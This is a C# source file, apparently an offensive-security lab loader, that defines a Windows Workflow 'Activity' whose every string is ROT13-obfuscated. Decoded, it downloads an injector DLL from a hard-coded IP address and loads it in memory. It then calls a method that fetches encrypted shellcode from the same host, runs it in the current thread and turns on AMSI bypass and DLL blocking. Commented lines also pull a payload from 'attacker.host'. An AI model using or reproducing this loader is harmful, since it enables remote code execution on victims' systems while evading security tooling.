//start
using System.Text;
using System.Linq;
using System;

using System.Reflection;
using System.Workflow.ComponentModel;
using System.Net;

public class Run : Activity
{
    public Run()
    {
            
           Console.WriteLine(new string("Ehaavat".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            var wc = new WebClient();
            wc.Headers.Add(new string("hfre-ntrag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("Zbmvyyn/5.0 (Jvaqbjf AG 10.0; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/79.0.3945.117 Fnsnev/537.36".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            // Assembly assembly = Assembly.LoadFile(new string(@"P:\\Hfref\zvxrt\Fbhepr\Ercbf\FunecRahzYvoenel\FunecRahzYvoenel\ova\Qroht\FunecRahzYvoenel.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            Assembly assembly = Assembly.Load(wc.DownloadData(new string("uggc://192.168.49.207/qvawrpgbe.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())));

            // Assembly assembly = Assembly.Load(System.Convert.FromBase64String(wc.DownloadString(new string("uggcf://nggnpxre.ubfg/FunecRahzYvoenel.qyy.o64".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))));

            //Assembly assembly = Assembly.LoadFile(new string(@"P:\Hfref\Bssfrp\Qrfxgbc\FunecHc\FunecHc\ova\k64\Eryrnfr\FunecHc.rkr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            var t = assembly.GetType(new string("ZpPuvpxra.Fcvpl".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            var c = Activator.CreateInstance(t);

            var m = t.GetMethod(new string("Obbz".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            var output = m.Invoke(c, new string[] { new string("pheeragguernq /fp:uggc://192.168.49.207/rap /c:pbyqcvmmn /nz51:gehr /erzbgrNz51:gehr /oybpxqyyf:gehr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) });


            //entryPoint.Invoke(null, new object[] { new string[] { new string("pheeragguernq /fp:uggc://192.168.49.207/rap /c:pbyqcvmmn /nz51:gehr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) } });

    }
}
